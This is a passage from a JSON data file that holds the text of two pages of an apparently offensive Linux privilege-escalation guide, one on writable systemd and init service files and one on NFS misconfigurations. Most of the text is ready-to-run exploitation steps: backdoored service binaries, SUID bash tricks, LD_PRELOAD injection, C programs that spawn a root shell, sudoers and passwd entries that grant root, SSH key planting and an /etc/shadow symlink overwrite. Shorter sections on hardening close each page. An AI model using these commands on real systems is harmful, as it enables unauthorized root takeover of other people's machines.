2>/dev/null); do echo \"=== $binary ===\" grep -r \"$binary\" /etc/systemd/system/ /etc/init.d/ 2>/dev/null | head -5 done # 3. Create malicious replacement cat > /tmp/malicious_binary \u003c\u003c 'EOF' #!/bin/bash # Execute backdoor cp /bin/bash /tmp/shell chmod +s /tmp/shell # Execute real binary to maintain service functionality /usr/bin/real_binary \"$@\" EOF chmod +x /tmp/malicious_binary # 4. Replace the binary (if writable) cp /tmp/malicious_binary /usr/bin/vulnerable_service # 5. Restart service or wait for next execution systemctl restart vulnerable_service # OR kill -9 \u003cPID> and let systemd restart it Example - Apache with Writable Binary: # /usr/sbin/apache2 is world-writable cp /tmp/backdoor /usr/sbin/apache2 systemctl restart apache2 # /tmp/shell becomes SUID root 4. Writable Service Configuration Files A. Systemd Unit Files Exploitation - Modify ExecStart: # 1. Find writable service file find /etc/systemd/system -name \"*.service\" -writable 2>/dev/null # 2. Edit service file vim /etc/systemd/system/backup.service # Change ExecStart to: ExecStart=/bin/bash -c 'chmod +s /bin/bash && /usr/bin/real_backup' # 3. Reload and restart systemctl daemon-reload systemctl restart backup.service Exploitation - Add ExecStartPre: # Add pre-execution command cat >> /etc/systemd/system/mysql.service \u003c\u003c 'EOF' ExecStartPre=/bin/bash -c 'chmod +s /bin/bash' EOF systemctl daemon-reload systemctl restart mysql Exploitation - Override Files: # Create override directory mkdir /etc/systemd/system/mysql.service.d/ # Create override file cat > /etc/systemd/system/mysql.service.d/override.conf \u003c\u003c 'EOF' [Service] ExecStart= ExecStart=/bin/bash -c 'chmod +s /bin/bash && /usr/sbin/mysqld' EOF systemctl daemon-reload systemctl restart mysql Exploitation - Environment Variables: # Add environment variable to service cat >> /etc/systemd/system/service.service \u003c\u003c 'EOF' [Service] Environment=\"LD_PRELOAD=/tmp/backdoor.so\" EOF systemctl daemon-reload systemctl restart service B. Init Scripts (/etc/init.d/) Exploitation: # 1. Find writable init scripts find /etc/init.d -type f -writable 2>/dev/null # 2. Modify the script vim /etc/init.d/backup # Add at the beginning: chmod +s /bin/bash # 3. Restart service service backup restart # OR /etc/init.d/backup restart Example Injection: # Original script #!/bin/sh # /etc/init.d/backup case \"$1\" in start) /usr/local/bin/backup.sh ;; # Modified script #!/bin/sh chmod +s /bin/bash case \"$1\" in start) /usr/local/bin/backup.sh ;; C. xinetd Services (/etc/xinetd.d/) Exploitation: # 1. Find writable xinetd configuration find /etc/xinetd.d -type f -writable 2>/dev/null # 2. Modify service vim /etc/xinetd.d/tftp # Add or modify: server = /bin/bash server_args = -c 'chmod +s /bin/bash && /usr/sbin/in.tftpd' # 3. Restart xinetd systemctl restart xinetd # OR service xinetd restart 5. Service User Misconfigurations A. Service Running as Root Check Service User: # Systemd systemctl show service_name -p User systemctl show service_name -p Group # SysV ps aux | grep service_name # Check the user column Exploitation - Writable Service Directories: # If a root service writes to a directory you own # Example: /var/log/service/ is owned by user echo '#!/bin/bash chmod +s /bin/bash' > /var/log/service/script.sh # Service executes everything in that directory B. Service with Sudo Permissions Some services are configured to run with sudo without password. Exploitation: # Check sudo -l for service commands sudo -l | grep -i service # Example: user can run service command as root sudo /usr/sbin/service apache2 restart # If you can modify apache2 service configuration # Create malicious init script 6. Dangerous Service Options A. Systemd's ProtectSystem and PrivateTmp If these are set to false or off, services can write to system directories. Exploitation: # Check service settings systemctl show service_name -p ProtectSystem -p PrivateTmp # If ProtectSystem=off, the service can write to /etc, /usr, etc. # If PrivateTmp=off, the service shares /tmp with other processes B. Systemd's RootDirectory / RootImage If a service runs in a container/chroot, escaping is possible. Exploitation: # Check if service uses chroot systemctl show service_name -p RootDirectory # If set to a writable directory, you can modify the chroot C. Systemd's BindReadOnlyPaths / BindPaths If a service mounts directories, you might be able to write to them. Exploitation: # Check mounts systemctl show service_name -p BindReadOnlyPaths -p BindPaths # If /etc is mounted read-write, you can modify system files 7. Service File Inclusion/Import Some services include other configuration files or scripts. Exploitation: # 1. Find services that include files grep -r \"Include\\|Import\\|Source\" /etc/systemd/system/*.service 2>/dev/null grep -r \"\\. \" /etc/init.d/* 2>/dev/null # 2. If included directory is writable # Example: service includes /etc/service.d/*.conf # And /etc/service.d/ is writable # 3. Create malicious config echo '#!/bin/bash chmod +s /bin/bash' > /etc/service.d/backdoor.conf # 4. Restart service systemctl restart service 8. Service Dependencies Services can have dependencies that execute when they start/stop. Exploitation: # 1. Check service dependencies systemctl list-dependencies service_name # 2. Find writable dependency find /etc/systemd/system -name \"*.service\" -writable | grep -E \"dependency|target\" # 3. Modify dependency to include backdoor # Wait for original service to start/restart 9. Inetd / Xinetd Wrapper Scripts Exploitation: # 1. Find wrapper scripts in xinetd configs grep -r \"server\" /etc/xinetd.d/* | grep -v \"/usr\\|/bin\\|/sbin\" # 2. If wrapper script is writable vim /etc/xinetd.d/myservice # Contains: server = /usr/local/bin/myservice_wrapper # 3. Modify wrapper echo '#!/bin/bash chmod +s /bin/bash /usr/bin/real_service' > /usr/local/bin/myservice_wrapper chmod +x /usr/local/bin/myservice_wrapper # 4. Connect to service to trigger nc localhost \u003cport> 10. Service Socket Activation Systemd socket-activated services start on demand when a connection is received. Exploitation: # 1. Find socket-activated services systemctl list-units --type=socket --state=running # 2. Check service and socket configuration systemctl cat service_name.socket systemctl cat service_name.service # 3. If service file is writable, modify it # 4. Restart socket systemctl restart service_name.socket # 5. Trigger by connecting to socket nc localhost \u003cport> 11. Service Temporary Files Services often create temporary files in /tmp or /var/tmp. Exploitation: # 1. Monitor service's temporary file creation strace -e openat -p \u003cservice_pid> 2>&1 | grep -E \"/tmp|/var/tmp\" # 2. Create symlink to sensitive file ln -s /etc/shadow /tmp/service_temp_file # 3. Wait for service to write to it (TOCTOU) # If service is root, it overwrites /etc/shadow 12. Practical Exploitation Workflow Step 1: Enumerate Services: # All running services systemctl list-units --type=service --state=running --no-legend # Check each service's configuration for service in $(systemctl list-units --type=service --state=running --no-legend | awk '{print $1}'); do echo \"=== $service ===\" systemctl cat $service 2>/dev/null | head -20 echo done Step 2: Check Permissions: # Check service files find /etc/systemd/system /lib/systemd/system -name \"*.service\" -writable 2>/dev/null find /etc/init.d -type f -writable 2>/dev/null # Check service binaries for service in $(systemctl list-units --type=service --state=running --no-legend | awk '{print $1}'); do binary=$(systemctl show $service -p ExecStart --no-pager 2>/dev/null | cut -d= -f2 | awk '{print $1}') if [ -n \"$binary\" ] && [ -f \"$binary\" ] && [ -w \"$binary\" ]; then echo \"[!] Writable binary: $binary ($service)\" fi done Step 3: Identify Best Target: # Look for services that: # 1. Run as root (User=root) # 2. Have writable configuration files # 3. Have writable binaries # 4. Have dangerous options # 5. Are commonly used and unlikely to be removed Step 4: Create Exploit: # Option A: Modify service file vim /etc/systemd/system/target.service # Add: ExecStartPre=/bin/bash -c 'chmod +s /bin/bash' # Option B: Replace binary cp /tmp/backdoor /usr/bin/target_binary # Option C: Environment variable cat > /etc/systemd/system/target.service.d/override.conf \u003c\u003c 'EOF' [Service] Environment=\"LD_PRELOAD=/tmp/backdoor.so\" EOF Step 5: Trigger Execution: # Systemd systemctl daemon-reload systemctl restart target_service # SysV service target_service restart # xinetd systemctl restart xinetd # Then connect to the port Step 6: Verify: ls -la /bin/bash # -rwsr-sr-x 1 root root ... /bin/bash -p # root shell 13. Defensive Measures For System Administrators: Restrict Service File Permissions: # Protect systemd service files chmod 644 /etc/systemd/system/*.service chown root:root /etc/systemd/system/*.service # Protect init scripts chmod 755 /etc/init.d/* chown root:root /etc/init.d/* Use Systemd Security Features: # In service file: [Service] User=nobody Group=nogroup ProtectSystem=strict PrivateTmp=yes NoNewPrivileges=yes PrivateDevices=yes ProtectHome=yes ProtectKernelTunables=yes ProtectKernelModules=yes ProtectControlGroups=yes RestrictRealtime=yes Minimize Root Services: # Run services as non-root users User=www-data Group=www-data # Only grant necessary capabilities AmbientCapabilities=CAP_NET_BIND_SERVICE CapabilityBoundingSet=CAP_NET_BIND_SERVICE Use Read-Only Filesystems: # Mount /usr as read-only mount -o remount,ro /usr # Or use overlayfs for writable layers Monitor Service Changes: # Audit service file changes auditctl -w /etc/systemd/system/ -p wa -k systemd_changes auditctl -w /etc/init.d/ -p wa -k init_changes # Check service file integrity for file in /etc/systemd/system/*.service; do sha256sum \"$file\" >> /var/log/service_checksums done Regular Audits: # Check for writable service files daily find /etc/systemd/system /lib/systemd/system /etc/init.d -type f -writable ! -user root 2>/dev/null # Check service binaries for service in $(systemctl list-units --type=service --state=running --no-legend | awk '{print $1}'); do binary=$(systemctl show $service -p ExecStart --no-pager | cut -d= -f2 | awk '{print $1}') if [ -f \"$binary\" ] && [ ! -O \"$binary\" ]; then echo \"Warning: $binary not owned by root\" fi done Use AppArmor/SELinux: # Restrict service capabilities # Create profiles for critical services aa-enforce /etc/apparmor.d/usr.sbin.mysqld Service Hardening Checklist: [ ] All service files owned by root:root [ ] Service files not writable by group/others (chmod 644) [ ] Services run as least-privileged user [ ] ProtectSystem and PrivateTmp enabled [ ] NoNewPrivileges enabled [ ] Proper CapabilityBoundingSet [ ] Read-only filesystems where possible [ ] Regular integrity checks"},{"kind":"privesc","number":10,"order":210,"href":"privesc/10-nfs-misconfigurations.html","slug":"10-nfs-misconfigurations","page":"10-nfs-misconfigurations.html","title":"NFS Misconfigurations","short":"NFS","summary":"Enumerate exports and test root squash, writable shares and ownership mapping.","part":"privesc","partNum":"PE","partName":"Privilege Escalation","readMinutes":17,"words":1821,"sections":8,"codeBlocks":39,"headings":[{"id":"nfs-misconfigurations-for-privilege-escalation","text":"NFS Misconfigurations for Privilege Escalation","level":2},{"id":"1-understanding-nfs","text":"1. Understanding NFS","level":3},{"id":"2-enumeration-finding-nfs-shares","text":"2. Enumeration: Finding NFS Shares","level":3},{"id":"3-exploitation-vectors","text":"3. Exploitation Vectors","level":3},{"id":"4-nfs-in-containerized-environments","text":"4. NFS in Containerized Environments","level":3},{"id":"5-practical-exploitation-workflow","text":"5. Practical Exploitation Workflow","level":3},{"id":"6-defensive-measures","text":"6. Defensive Measures","level":3},{"id":"7-nfs-export-options-cheatsheet","text":"7. NFS Export Options Cheatsheet","level":3}],"text":"NFS Misconfigurations for Privilege Escalation Network File System (NFS) misconfigurations are a powerful privilege escalation vector. When NFS shares are insecurely exported, attackers can mount them, access sensitive files, and manipulate system files to gain root access. 1. Understanding NFS What is NFS? Network File System protocol for sharing files over a network Allows remote clients to mount directories as if they were local Uses UID/GID mapping for permissions Root squashing is a key security feature Key Concepts: Exports: Directories shared via /etc/exports Root Squashing: Maps root (UID 0) to nobody (UID 65534) by default No Root Squash: Allows root UID to retain privileges (dangerous!) File Permissions: Standard Unix permissions apply (rwx) GID/UID Mapping: Remote UIDs map to local UIDs 2. Enumeration: Finding NFS Shares Check Mounted NFS Shares: mount | grep nfs df -h | grep nfs # Show NFS mount information showmount -e localhost # OR showmount -e 127.0.0.1 # Show all NFS exports exportfs -v cat /etc/exports Check for NFS Services: # Check if NFS server is running ps aux | grep nfs systemctl status nfs-server netstat -tulpn | grep 2049 rpcinfo -p | grep nfs Find NFS Files (from local mounts): # Find files on NFS mounts find / -type f -path \"/mnt/nfs/*\" 2>/dev/null find / -type f -path \"/net/*\" 2>/dev/null Automated Tools: # LinPEAS NFS checks ./linpeas.sh | grep -A 10 \"NFS\" # Check for writable NFS shares for mount in $(mount | grep nfs | awk '{print $3}'); do if [ -w \"$mount\" ]; then echo \"[!] Writable NFS mount: $mount\" fi done 3. Exploitation Vectors A. No Root Squash (Most Critical) If a share has no_root_squash in the exports, remote root users maintain root privileges. Check for No Root Squash: # Examine /etc/exports cat /etc/exports # Look for: /share *(rw,no_root_squash) # OR: /share 192.168.1.0/24(rw,no_root_squash) # Show current exports exportfs -v # Output: /share 192.168.1.0/24(rw,wdelay,no_root_squash,no_subtree_check,sec=sys,rw,secure,no_root_squash) Exploitation - Local: # 1. Mount the share (if already mounted, skip) mkdir /tmp/nfs mount -t nfs 127.0.0.1:/share /tmp/nfs # 2. Create a SUID binary on the share as local root cat > /tmp/nfs/backdoor.c \u003c\u003c 'EOF' #include \u003cstdio.h> #include \u003cstdlib.h> #include \u003cunistd.h> int main() { setuid(0); setgid(0); system(\"/bin/bash -p\"); return 0; } EOF # 3. Compile as root (using fakeroot or local root) gcc /tmp/nfs/backdoor.c -o /tmp/nfs/backdoor chmod +s /tmp/nfs/backdoor chown root:root /tmp/nfs/backdoor # 4. Execute as normal user /tmp/nfs/backdoor # Root shell! Exploitation - Remote: # As local attacker with no root: # 1. Create fake root environment mkdir /tmp/rootfs # 2. Create and compile as \"root\" using fakeroot fakeroot bash # Now inside fakeroot gcc backdoor.c -o /tmp/rootfs/backdoor chmod +s /tmp/rootfs/backdoor # 3. Mount the NFS share mkdir /tmp/mount mount -t nfs target_ip:/share /tmp/mount # 4. Copy the SUID binary (as root from fakeroot) cp /tmp/rootfs/backdoor /tmp/mount/backdoor # 5. On target system, execute: /tmp/mount/backdoor B. Writable NFS Shares Even with root squash, writable shares can lead to privilege escalation. Exploitation - Sudoers File: # If /etc/sudoers is on a writable NFS share (rare but possible) # Or if share contains a writable config file # 1. Mount the share mount -t nfs target:/share /tmp/nfs # 2. Check if any system file is on the share find /tmp/nfs -name \"sudoers\" -o -name \"passwd\" -o -name \"shadow\" 2>/dev/null # 3. Modify if found echo 'user ALL=(ALL) NOPASSWD: ALL' >> /tmp/nfs/sudoers Exploitation - Cron Jobs: # If share contains cron scripts # 1. Mount share mount -t nfs target:/share /tmp/nfs # 2. Check for cron scripts find /tmp/nfs -name \"*.sh\" | grep -E \"cron|daily|hourly\" # 3. Modify writable cron script echo '#!/bin/bash chmod +s /bin/bash' >> /tmp/nfs/backup.sh # 4. Wait for cron to execute Exploitation - SSH Keys: # If share contains SSH home directories # 1. Mount share mount -t nfs target:/home /tmp/nfs # 2. Add your public key to root's authorized_keys cat ~/.ssh/id_rsa.pub >> /tmp/nfs/root/.ssh/authorized_keys # 3. SSH as root ssh root@target Exploitation - Password File: # If /etc/passwd or /etc/shadow is on NFS (very dangerous) # 1. Mount share mount -t nfs target:/etc /tmp/nfs # 2. Generate password hash openssl passwd -1 -salt abc password123 # Output: $1$abc$0J/2wzDqgVX6j.GL5hH3X. # 3. Add new root user to /tmp/nfs/passwd echo 'hacker:$1$abc$0J/2wzDqgVX6j.GL5hH3X.:0:0:Hacker:/root:/bin/bash' >> /tmp/nfs/passwd # 4. su hacker (password: password123) # OR su - hacker C. ID Mapping Exploits NFS maps remote UIDs to local UIDs. If a local user has the same UID as a remote user, they can access files. Check UID/GID Mapping: # Show NFS mounts with UID/GID options mount | grep nfs # Check current user's UID id # uid=1000(user) gid=1000(user) # Check what UIDs are mapped cat /etc/idmapd.conf Exploitation - UID 0 (Root) Masquerade: # 1. Create local user with UID 0 useradd -o -u 0 -g 0 nfsroot # OR manually in /etc/passwd echo 'nfsroot:x:0:0:root:/root:/bin/bash' >> /etc/passwd # 2. Mount NFS share mount -t nfs target:/share /tmp/nfs # 3. Access files as root su - nfsroot cp /tmp/nfs/root_owned_file /tmp/ Exploitation - GID 0 (Root Group): # 1. Create local user with GID 0 usermod -g 0 user # OR echo 'user:x:1000:0:User:/home/user:/bin/bash' >> /etc/passwd # 2. Access group-writable NFS files D. Insecure Export Options Check Export Options: exportfs -v # Look for: # - rw (read/write) - writable share # - insecure - allows connections from high ports # - nohide - allows traversing submounts # - no_subtree_check - doesn't verify submounts # - fsid=0 - exported as root filesystem Exploitation - Submount Traversal: # If share has nohide, you can access submounts mount -t nfs target:/share /tmp/nfs ls /tmp/nfs/submount # Even if not explicitly exported Exploitation - Cross-Mounting: # If share has crossmnt, you can access other filesystems mount -t nfs target:/share /tmp/nfs ls /tmp/nfs/../../etc/ # May leak to parent filesystem E. SUID/GUID Binary Upload If NFS share is writable but has no_root_squash, you can create SUID binaries. Exploitation: # 1. Mount NFS share mkdir /tmp/nfs mount -t nfs target:/share /tmp/nfs # 2. Create SUID binary cat > /tmp/nfs/exploit.c \u003c\u003c 'EOF' #include \u003cstdio.h> #include \u003cstdlib.h> #include \u003cunistd.h> int main() { setuid(0); setgid(0); execve(\"/bin/bash\", NULL, NULL); } EOF # 3. Compile with root privileges (if you have root or fakeroot) gcc /tmp/nfs/exploit.c -o /tmp/nfs/exploit chmod +s /tmp/nfs/exploit chown root:root /tmp/nfs/exploit # 4. Execute on target /tmp/nfs/exploit F. Using NFS to Escape Chroot/Jail If a chroot has NFS mounted inside, you can escape. Exploitation: # 1. Mount NFS share inside chroot mount -t nfs target:/share /chroot/tmp/nfs # 2. Create device file (if NFS supports) mknod /chroot/tmp/nfs/test b 1 0 # 3. Access /dev/ram0 via NFS cat /chroot/tmp/nfs/test 4. NFS in Containerized Environments NFS misconfigurations in containers can lead to container escapes. Exploitation: # 1. If container mounts NFS share with no_root_squash # 2. Inside container as root (if you have root in container) mount -t nfs host:/share /mnt # 3. Create SUID binary on NFS share gcc /mnt/exploit.c -o /mnt/exploit chmod +s /mnt/exploit # 4. Access SUID binary from host /mnt/exploit # Runs as root on host 5. Practical Exploitation Workflow Step 1: Enumerate NFS: # Check if NFS server is running rpcinfo -p | grep nfs showmount -e localhost # Check exports exportfs -v cat /etc/exports # Check mounted shares mount | grep nfs df -h | grep nfs Step 2: Test Write Access: # Test if share is writable touch /mnt/nfs/test_file if [ $? -eq 0 ]; then echo \"[+] NFS share is writable\" fi # Test if you can create SUID binaries cp /bin/bash /mnt/nfs/bash chmod +s /mnt/nfs/bash ls -la /mnt/nfs/bash # If SUID bit is set, no_root_squash is enabled Step 3: Choose Attack Vector: # Priority: # 1. no_root_squash -> create SUID binary (instant root) # 2. Writable share -> modify system files (sudoers, passwd, cron scripts) # 3. ID mapping -> create local user with matching UID # 4. SSH keys -> add SSH public key # 5. Cron scripts -> inject malicious commands Step 4: Create Exploit: Option A - SUID Binary (no_root_squash): # Using fakeroot (if you're not root) fakeroot bash gcc -o /mnt/nfs/exploit exploit.c chmod +s /mnt/nfs/exploit chown root:root /mnt/nfs/exploit exit # Exit fakeroot # Execute on target /mnt/nfs/exploit Option B - Modify Sudoers: # If /etc/sudoers is on NFS echo 'user ALL=(ALL) NOPASSWD: ALL' >> /mnt/nfs/sudoers sudo bash Option C - Add SSH Key: # If /root/.ssh/ is on NFS mkdir -p /mnt/nfs/root/.ssh echo \"ssh-rsa AAA...\" > /mnt/nfs/root/.ssh/authorized_keys chmod 600 /mnt/nfs/root/.ssh/authorized_keys ssh root@target Option D - Cron Scripts: # If cron script is on NFS echo '#!/bin/bash cp /bin/bash /tmp/bash chmod +s /tmp/bash' > /mnt/nfs/backup.sh chmod +x /mnt/nfs/backup.sh # Wait for cron execution /tmp/bash -p Step 5: Trigger Execution: # If SUID binary: just execute /mnt/nfs/exploit # If sudoers: sudo bash sudo bash # If SSH keys: ssh root@target ssh root@target # If cron scripts: wait # Or force cron execution (if possible) crontab -l # Check next execution time Step 6: Verify: id # uid=0(root) gid=0(root) whoami # root 6. Defensive Measures For System Administrators: Never Use no_root_squash: # BAD /share *(rw,no_root_squash) # GOOD /share *(rw,root_squash) # root_squash is default Use Anonuid/Anongid Mapping: # Map all remote users to a specific user /share *(rw,anonuid=65534,anongid=65534) Restrict Exports with IP Ranges: # Allow only specific subnets /share 192.168.1.0/24(rw,sync,no_subtree_check) /share 10.0.0.0/8(rw,sync,no_subtree_check) Use Read-Only Where Possible: # BAD (writable) /share *(rw) # GOOD (read-only) /share *(ro) Set Proper File Permissions: # Ensure exported directory has proper permissions chmod 755 /share chown root:root /share Use NFSv4 with Kerberos: # Secure authentication /share *(sec=krb5p:krb5i:krb5) Mount Options: # Client-side security mount -t nfs -o nosuid,noexec,nodev target:/share /mnt/nfs # Prevent SUID binaries, executable files, and device files Firewall Protection: # Restrict NFS ports iptables -A INPUT -p tcp --dport 2049 -s 192.168.1.0/24 -j ACCEPT iptables -A INPUT -p tcp --dport 2049 -j DROP Monitor NFS Activity: # Audit NFS access auditctl -w /etc/exports -p wa -k nfs_exports auditctl -w /share -p rwxa -k nfs_share # Monitor NFS connections netstat -tn | grep 2049 Regular Audits: # Check for no_root_squash exportfs -v | grep no_root_squash # Check for writable NFS mounts for mount in $(mount | grep nfs | awk '{print $3}'); do if [ -w \"$mount\" ]; then echo \"Warning: Writable NFS mount: $mount\" fi done 7. NFS Export Options Cheatsheet Option Description Security Impact rw Read/Write High - allows file modification ro Read-Only Low - only file reading no_root_squash Root privileges preserved Critical - root escalation root_squash Root mapped to nobody Safe - prevents root access all_squash All users mapped to nobody Very Safe - no privileges anonuid UID for anonymous users Medium - can be exploited anongid GID for anonymous users Medium - can be exploited insecure Allow high port connections Medium - firewall bypass secure Require privileged ports Safer - restricts connections no_subtree_check No submount verification Low - performance subtree_check Verify submounts Safer - prevents traversal nohide Show submounts Low - information leak hide Hide submounts Safer - less information fsid=0 Root filesystem export High - filesystem access sync Synchronous writes Safe - data integrity async Asynchronous writes Medium - potential data loss"}]};
